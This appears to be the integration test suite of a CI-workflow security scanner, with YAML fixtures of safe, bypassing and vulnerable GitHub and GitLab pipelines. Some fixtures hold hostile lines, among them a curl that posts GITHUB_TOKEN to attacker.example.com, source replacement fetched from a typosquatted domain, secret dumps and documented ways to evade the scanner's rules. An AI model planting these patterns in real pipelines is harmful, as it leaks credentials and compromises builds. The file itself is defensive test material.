"""Integration test suite for taintly.

Unlike rule self-tests (which validate each rule against its own curated samples),
integration tests verify rules against realistic full-file YAML scenarios organized
into four categories:

  FALSE_POSITIVE  — safe code that must NOT trigger the listed rules.
                    A failure here means the rule produces noise that kills adoption.

  KNOWN_BYPASS    — genuinely dangerous patterns the tool cannot currently detect.
                    These are documented limitations. Tracking them means users
                    understand the ceiling and future fixes get regression tests.

  STRUCTURAL      — complex YAML (anchors, 4-space indent, matrix, nested jobs)
                    that must still trigger the expected rules despite formatting.

  REALISTIC       — complete multi-rule vulnerable workflows tested end-to-end.

Run with: python -m taintly --integration-test
"""

from __future__ import annotations

from dataclasses import dataclass

from taintly.engine import scan_file
from taintly.models import Rule

# ---------------------------------------------------------------------------
# Test case model
# ---------------------------------------------------------------------------


@dataclass
class IntegrationTestCase:
    name: str
    category: str  # "false_positive" | "known_bypass" | "structural" | "realistic"
    platform: str  # "github" | "gitlab"
    content: str  # Full YAML file content
    must_fire: list[str]  # Rule IDs that MUST appear in findings
    must_not_fire: list[str]  # Rule IDs that must NOT appear in findings
    notes: str = ""  # Why this case matters


@dataclass
class IntegrationTestResult:
    case: IntegrationTestCase
    passed: bool
    unexpected_fires: list[str]  # Rules that fired but were in must_not_fire
    missed_rules: list[str]  # Rules that didn't fire but were in must_fire
    all_fired: list[str]  # Every rule ID that actually fired


# ---------------------------------------------------------------------------
# Test runner
# ---------------------------------------------------------------------------


def run_integration_tests(
    rules: list[Rule],
    categories: list[str] | None = None,
) -> list[IntegrationTestResult]:
    """Run all integration test cases and return results."""
    cases = _build_cases()
    if categories:
        cases = [c for c in cases if c.category in categories]

    results = []
    for case in cases:
        platform_rules = [r for r in rules if r.platform.value == case.platform]

        import os
        import tempfile

        with tempfile.NamedTemporaryFile(
            mode="w", suffix=".yml", delete=False, encoding="utf-8"
        ) as f:
            f.write(case.content)
            tmp_path = f.name

        try:
            findings = scan_file(tmp_path, platform_rules)
        finally:
            os.unlink(tmp_path)

        fired_ids = {f.rule_id for f in findings if not f.rule_id.startswith("ENGINE")}

        unexpected = [r for r in case.must_not_fire if r in fired_ids]
        missed = [r for r in case.must_fire if r not in fired_ids]
        passed = not unexpected and not missed

        results.append(
            IntegrationTestResult(
                case=case,
                passed=passed,
                unexpected_fires=unexpected,
                missed_rules=missed,
                all_fired=sorted(fired_ids),
            )
        )

    return results


# ---------------------------------------------------------------------------
# Output formatter
# ---------------------------------------------------------------------------


def format_integration_results(results: list[IntegrationTestResult]) -> str:
    out = ["\n\033[1m═══ INTEGRATION TEST RESULTS ═══\033[0m\n"]

    by_cat: dict[str, list[IntegrationTestResult]] = {}
    for r in results:
        by_cat.setdefault(r.case.category, []).append(r)

    category_order = ["false_positive", "known_bypass", "structural", "realistic"]
    category_labels = {
        "false_positive": "FALSE POSITIVE checks (must not fire)",
        "known_bypass": "KNOWN BYPASSES     (tool cannot detect — documented gaps)",
        "structural": "STRUCTURAL variants (complex YAML — must still fire)",
        "realistic": "REALISTIC workflows (end-to-end coverage)",
    }

    total_passed = sum(1 for r in results if r.passed)
    total = len(results)

    for cat in category_order:
        if cat not in by_cat:
            continue
        cat_results = by_cat[cat]
        cat_pass = sum(1 for r in cat_results if r.passed)
        label = category_labels.get(cat, cat.upper())
        out.append(f"\033[1m{label}\033[0m  [{cat_pass}/{len(cat_results)}]")

        for r in cat_results:
            icon = "✓" if r.passed else "✗"
            color = "\033[92m" if r.passed else "\033[91m"
            out.append(f"  {color}{icon}\033[0m  {r.case.name}")
            if r.case.notes and cat == "known_bypass":
                out.append(f"       \033[90m{r.case.notes}\033[0m")
            if not r.passed:
                if r.unexpected_fires:
                    out.append(
                        f"       \033[91mFALSE POSITIVE: {r.unexpected_fires} fired unexpectedly\033[0m"
                    )
                if r.missed_rules:
                    out.append(f"       \033[91mMISSED: {r.missed_rules} did not fire\033[0m")
        out.append("")

    out.append(f"Total: {total_passed}/{total} passed")
    # all_passed = total_passed == total  # category-aware check below
    # known_bypass cases are expected to "pass" (tool correctly not detecting them)
    # so the overall pass/fail only counts non-bypass categories
    non_bypass = [r for r in results if r.case.category != "known_bypass"]
    non_bypass_passed = all(r.passed for r in non_bypass)
    out.append(
        f"\n{'✓ ALL INTEGRATION TESTS PASSED' if non_bypass_passed else '✗ INTEGRATION TEST FAILURES DETECTED'}"
    )
    if not non_bypass_passed:
        out.append("  (known_bypass failures are expected — they document tool limitations)")

    return "\n".join(out)


# ---------------------------------------------------------------------------
# Test case definitions
# ---------------------------------------------------------------------------


def _build_cases() -> list[IntegrationTestCase]:
    cases: list[IntegrationTestCase] = []

    # =========================================================================
    # FALSE POSITIVE — safe code that must NOT trigger specific rules
    # =========================================================================

    # NOTE: The YAML anchor case for SEC4-GH-005 is a known false positive — see known_bypass section.

    cases.append(
        IntegrationTestCase(
            name="SEC2-GH-002: GitHub context in env: block shields run: from injection",
            category="false_positive",
            platform="github",
            notes=(
                "Context written to env: var is a known safe pattern — the shell treats "
                "$VAR as a single token, preventing injection. SEC4-GH-004 fires on the "
                "env: line (correct) but SEC4-GH-006/007 must not fire."
            ),
            must_fire=[],
            must_not_fire=["SEC4-GH-006", "SEC4-GH-007", "SEC4-GH-014"],
            content="""\
name: Comment on PR
on: pull_request_target
permissions:
  pull-requests: write

jobs:
  comment:
    runs-on: ubuntu-latest
    steps:
      - name: Post comment
        env:
          PR_TITLE: ${{ github.event.pull_request.title }}
        run: |
          gh pr comment ${{ github.event.pull_request.number }} \
            --body "Processing: $PR_TITLE"
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC3-GH-001: SHA-pinned actions must not trigger unpinned rule",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC3-GH-001", "SEC3-GH-002"],
            content="""\
name: Build
on: push
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
      - uses: actions/setup-node@1a4442cacd436585916779262731d1f9a026da5d # v3
      - run: npm ci && npm test
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC4-GH-011: pull_request (not pull_request_target) with npm is safe",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC4-GH-011"],
            content="""\
name: CI
on: pull_request
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: npm install && npm test
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC4-GH-013: inline if condition is not a block scalar",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC4-GH-013"],
            content="""\
name: Deploy
on: push
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - if: github.ref == 'refs/heads/main' && github.event_name == 'push'
        run: echo "deploying"
      - if: github.actor != 'dependabot[bot]'
        run: echo "not a bot"
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC4-GH-010: actor check used in a log message, not as security gate",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC4-GH-010"],
            content="""\
name: Debug info
on: push
permissions:
  contents: read

jobs:
  info:
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Actor: ${{ github.actor }}"
          echo "Event: ${{ github.event_name }}"
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC6-GH-001: test/dummy credential values must not trigger hardcoded secret rule",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC6-GH-001"],
            content="""\
name: Integration test
on: push
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    env:
      DB_URL: postgres://test:test@localhost:5432/testdb
    steps:
      - run: |
          # Fixture credentials for local test DB only
          export DATABASE_URL="$DB_URL"
          go test ./...
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="SEC5-GH-001: id-token write present AND OIDC action present — no false positive",
            category="false_positive",
            platform="github",
            must_fire=[],
            must_not_fire=["SEC5-GH-001"],
            content="""\
name: Deploy to AWS
on: push
permissions:
  id-token: write
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502 # v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy
          aws-region: us-east-1
      - run: aws s3 sync dist/ s3://my-bucket/
""",
        )
    )

    # =========================================================================
    # KNOWN BYPASSES — genuine vulnerabilities the tool cannot currently detect
    #
    # Integration testing revealed that several initially assumed bypasses are
    # NOT actual bypasses:
    #
    # - YAML flow syntax: ContextPattern rules check file-wide, not scope-based,
    #   so `on: [pull_request_target]` in flow syntax still triggers SEC4-GH-011.
    #   (BlockPattern rules would be fooled, but none currently exist.)
    #
    # - eval "$CMD" with curl|bash in env var value: SEC6-GH-007 scans ALL lines
    #   including env var value strings, so it detects the pattern even there.
    #
    # - persist-credentials block scalar (|-): rule correctly fires because
    #   `persist-credentials:\s*false` cannot match `persist-credentials: |-`.
    #
    # - Lookahead window padding: rule correctly fires when checksum is genuinely
    #   too far from the download (which is still a real vulnerability).
    #
    # Confirmed real bypasses are documented below.
    # =========================================================================

    cases.append(
        IntegrationTestCase(
            name="BYPASS: ACTIONS_ALLOW_UNSECURE_COMMANDS via shell export",
            category="known_bypass",
            platform="github",
            notes=(
                "SEC4-GH-009 checks for the YAML key 'ACTIONS_ALLOW_UNSECURE_COMMANDS: true'. "
                "Setting it via 'export' in a run: block is semantically equivalent "
                "but invisible to the rule — the danger is in the shell, not the YAML structure."
            ),
            must_fire=[],
            must_not_fire=["SEC4-GH-009"],
            content="""\
name: CI
on: push
permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: |
          export ACTIONS_ALLOW_UNSECURE_COMMANDS=true
          echo "::set-env name=FOO::bar"
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="BYPASS: Orphaned fork SHA — Trivy attack (Mar 2026) evades SEC3-GH-001",
            category="known_bypass",
            platform="github",
            notes=(
                "SEC3-GH-001 treats ANY 40-char hex string as a safe pin. The aquasecurity/trivy "
                "attack used SHA 70379aad...1d0 — valid hex pointing to an orphaned fork commit "
                "that never belonged to any branch in actions/checkout. GitHub resolves fork "
                "commits transparently; only a GitHub API call to "
                "repos/{owner}/{repo}/commits/{sha}/branches-where-head (empty list = orphaned) "
                "reveals the deception. Static YAML analysis cannot distinguish real from orphaned."
            ),
            must_fire=[],
            must_not_fire=["SEC3-GH-001"],
            content="""\
name: Release
on:
  push:
    tags: ['v*']
permissions:
  contents: write

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      # SHA comment says v6.0.2 but SHA points to an orphaned fork commit.
      # The tool sees 40 valid hex chars and considers this safely pinned.
      - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2
        with:
          persist-credentials: false
      - uses: goreleaser/goreleaser-action@9c156b3f9d37f6a54e23e27b5ecc7cf7fa96c3cd # v6
        with:
          args: release --skip=validate
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="BYPASS: SEC4-GH-005 false positive — persist-credentials set via YAML anchor",
            category="known_bypass",
            platform="github",
            notes=(
                "SEC4-GH-005 uses an 8-line lookahead after the checkout line to find "
                "'persist-credentials: false'. When the value is injected via a YAML anchor "
                "merge key (<<: *opts), the raw text shows '<<: *opts', not the expanded value. "
                "The anchor definition is typically at the TOP of the file (before the jobs "
                "section), so it falls outside the lookahead window. Result: rule fires even "
                "though persist-credentials IS properly set to false — a false positive."
            ),
            must_fire=["SEC4-GH-005"],  # Rule incorrectly fires here — that's the FP
            must_not_fire=[],
            content="""\
name: CI
on: push
permissions:
  contents: read

checkout_opts: &checkout_opts
  persist-credentials: false
  fetch-depth: 0

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          <<: *checkout_opts
      - run: npm ci && npm test
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="BYPASS: Multi-step secret exfiltration via job outputs",
            category="known_bypass",
            platform="github",
            notes=(
                "SEC6-GH-004/005 detect secrets used directly in run: blocks. "
                "Routing a secret through a step output (GITHUB_OUTPUT → needs.X.outputs.Y) "
                "splits the access across two jobs; neither job individually matches the pattern. "
                "Cross-job data flow is invisible to static single-file analysis."
            ),
            must_fire=[],
            must_not_fire=["SEC6-GH-004", "SEC6-GH-005"],
            content="""\
name: Exfil via outputs
on: push
permissions:
  contents: read

jobs:
  extract:
    runs-on: ubuntu-latest
    outputs:
      tok: ${{ steps.get.outputs.tok }}
    steps:
      - id: get
        run: echo "tok=$GITHUB_TOKEN" >> $GITHUB_OUTPUT

  use:
    needs: extract
    runs-on: ubuntu-latest
    steps:
      - run: |
          curl -d "data=${{ needs.extract.outputs.tok }}" https://attacker.example.com/collect
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="BYPASS: GITHUB_ENV injection via variable indirection",
            category="known_bypass",
            platform="github",
            notes=(
                "SEC4-GH-006 looks for the literal string '$GITHUB_ENV' after the context value. "
                "Storing $GITHUB_ENV in a shell variable first breaks the single-line pattern match. "
                "The injection is semantically identical — writing to $OUT writes to $GITHUB_ENV."
            ),
            must_fire=[],
            must_not_fire=["SEC4-GH-006"],
            content="""\
name: PR handler
on: pull_request_target
permissions:
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - run: |
          OUT="$GITHUB_ENV"
          echo "TITLE=${{ github.event.pull_request.title }}" >> "$OUT"
""",
        )
    )

    # =========================================================================
    # STRUCTURAL — complex YAML that rules must still detect correctly
    # =========================================================================

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: 4-space indentation — SEC3-GH-001 must still fire",
            category="structural",
            platform="github",
            must_fire=["SEC3-GH-001"],
            must_not_fire=[],
            content="""\
name: Build
on: push

jobs:
    build:
        runs-on: ubuntu-latest
        steps:
            - uses: actions/checkout@v4
            - uses: actions/setup-node@v3
            - run: npm test
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: Matrix strategy with deploy job — SEC1-GH-001 must fire",
            category="structural",
            platform="github",
            must_fire=["SEC1-GH-001"],
            must_not_fire=[],
            content="""\
name: Deploy matrix
on: push
permissions:
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        region: [us-east-1, eu-west-1, ap-southeast-1]
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: ./scripts/deploy.sh ${{ matrix.region }}
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: Dangerous pattern in second of three jobs — SEC4-GH-004 must fire",
            category="structural",
            platform="github",
            must_fire=["SEC4-GH-004"],
            must_not_fire=[],
            content="""\
name: Multi-job
on: pull_request
permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: npm run lint

  test:
    runs-on: ubuntu-latest
    needs: lint
    steps:
      - run: echo "PR title is ${{ github.event.pull_request.title }}"

  deploy:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - run: echo "done"
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: YAML anchors for non-security content — vulnerable pattern still detected",
            category="structural",
            platform="github",
            must_fire=["SEC3-GH-001"],
            must_not_fire=[],
            content="""\
name: Shared steps
on: push
permissions:
  contents: read

common_env: &common_env
  NODE_ENV: production
  LOG_LEVEL: info

jobs:
  build:
    runs-on: ubuntu-latest
    env:
      <<: *common_env
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: Deep nesting with if-conditions — SEC2-GH-001 must still fire",
            category="structural",
            platform="github",
            must_fire=["SEC2-GH-001"],
            must_not_fire=[],
            content="""\
name: Complex workflow
on:
  push:
    branches: [main]
  pull_request:

permissions: write-all

jobs:
  build:
    if: github.event_name == 'push'
    runs-on: ubuntu-latest
    steps:
      - if: github.ref == 'refs/heads/main'
        uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: make build
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: GitLab with 4-space indent and remote include — SEC3-GL-001 must fire",
            category="structural",
            platform="gitlab",
            must_fire=["SEC3-GL-001"],
            must_not_fire=[],
            content="""\
include:
    - remote: 'https://example.com/ci-templates/base.yml'

stages:
    - build
    - test

build:
    stage: build
    script:
        - make build
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="STRUCTURAL: Workflow with inline comments — SEC4-GH-006 must still fire",
            category="structural",
            platform="github",
            must_fire=["SEC4-GH-006"],
            must_not_fire=[],
            content="""\
name: PR Labeler
on: pull_request_target
permissions:
  contents: read

jobs:
  label:
    runs-on: ubuntu-latest
    steps:
      - name: Set env from PR  # This sets the title in the environment
        run: echo "TITLE=${{ github.event.pull_request.title }}" >> $GITHUB_ENV  # inject
""",
        )
    )

    # =========================================================================
    # REALISTIC — full vulnerable workflows exercising multiple rules
    # =========================================================================

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: Classic PPE workflow (pull_request_target + checkout + secrets)",
            category="realistic",
            platform="github",
            must_fire=["SEC4-GH-001", "SEC4-GH-011"],
            must_not_fire=[],
            content="""\
name: PR Test and Label
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm install && npm test
      - uses: actions/github-script@v6
        with:
          script: |
            github.rest.issues.addLabels({
              owner: context.repo.owner,
              repo: context.repo.repo,
              issue_number: context.issue.number,
              labels: ['tested']
            })
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: Trivy-style supply chain attack — orphaned SHA + source replacement",
            category="realistic",
            platform="github",
            notes=(
                "Mirrors the March 2026 aquasecurity/trivy attack. The checkout SHA is an orphaned "
                "fork commit — 40 valid hex chars, so SEC3-GH-001 does NOT fire (documented bypass). "
                "The setup step downloads source file replacements from a typosquatted domain but "
                "uses curl -o (save to file) not curl | bash, so SEC6-GH-007 does not apply. "
                "What DOES fire: SEC3-GH-001 on the goreleaser unpinned tag reference, and "
                "SEC2-GH-001 on the write-all permissions."
            ),
            must_fire=["SEC2-GH-001", "SEC3-GH-001"],
            must_not_fire=[],
            content="""\
name: Release
on:
  push:
    tags: ['v*']
permissions: write-all

jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      # Orphaned fork commit — looks pinned, is not. SEC3-GH-001 does NOT fire here.
      - uses: actions/checkout@70379aad1a8b40919ce8b382d3cd7d0315cde1d0 # v6.0.2
      - name: Setup Checkout
        shell: bash
        run: |
          BASE="https://scan.aquasecurtiy.org/static"
          curl -sf "$BASE/main.go" -o cmd/trivy/main.go
          curl -sf "$BASE/scand.go" -o cmd/trivy/scand.go
          curl -sf "$BASE/fork_unix.go" -o cmd/trivy/fork_unix.go
      # Unpinned goreleaser tag — SEC3-GH-001 DOES fire here
      - uses: goreleaser/goreleaser-action@v5
        with:
          args: release --skip=validate
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: Credential-heavy workflow with multiple SEC6 violations",
            category="realistic",
            platform="github",
            must_fire=["SEC6-GH-001", "SEC6-GH-004"],
            must_not_fire=[],
            content="""\
name: Deploy
on: push
permissions: write-all

jobs:
  deploy:
    runs-on: ubuntu-latest
    env:
      DB_PASSWORD: "Sup3rS3cr3tPa55w0rd!"
      API_KEY: "sk-proj-abcdefghijklmnopqrstuvwxyz123456"
    steps:
      - uses: actions/checkout@v4
      - run: |
          echo "Secrets dump: ${{ toJSON(secrets) }}"
          docker login -u admin -p "$DB_PASSWORD" registry.example.com
          ./deploy.sh
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: workflow_run without conclusion gate (SEC4-GH-003)",
            category="realistic",
            platform="github",
            must_fire=["SEC4-GH-003"],
            must_not_fire=[],
            content="""\
name: Post-build deploy
on:
  workflow_run:
    workflows: [CI]
    types: [completed]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: ./deploy.sh
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: GitLab pipeline with debug trace and unquoted CI variable",
            category="realistic",
            platform="gitlab",
            must_fire=["SEC7-GL-001", "SEC4-GL-001"],
            must_not_fire=[],
            content="""\
variables:
  CI_DEBUG_TRACE: "true"

stages:
  - build
  - deploy

build:
  stage: build
  script:
    - echo "Building branch $CI_COMMIT_BRANCH"
    - make build

deploy:
  stage: deploy
  script:
    - ./deploy.sh $CI_COMMIT_MESSAGE
  only:
    - main
""",
        )
    )

    cases.append(
        IntegrationTestCase(
            name="REALISTIC: Full hardened workflow — no rules should fire",
            category="realistic",
            platform="github",
            must_fire=[],
            must_not_fire=[
                "SEC2-GH-001",
                "SEC2-GH-002",
                "SEC3-GH-001",
                "SEC3-GH-002",
                "SEC4-GH-001",
                "SEC4-GH-004",
                "SEC4-GH-005",
                "SEC4-GH-006",
                "SEC6-GH-001",
                "SEC6-GH-007",
            ],
            notes="A correctly hardened workflow used as a clean baseline.",
            content="""\
name: Hardened CI
on:
  push:
    branches: [main]
  pull_request:

permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - uses: actions/setup-node@1a4442cacd436585916779262731d1f9a026da5d # v3
        with:
          node-version: 20
      - run: npm ci
      - run: npm test
      - env:
          PR_NUM: ${{ github.event.pull_request.number }}
        run: |
          echo "Testing PR: $PR_NUM"

  lint:
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@57a97c7e7821a5776cebc9bb87c984fa69cba8f1 # v4
        with:
          persist-credentials: false
      - run: npm run lint
""",
        )
    )

    return cases
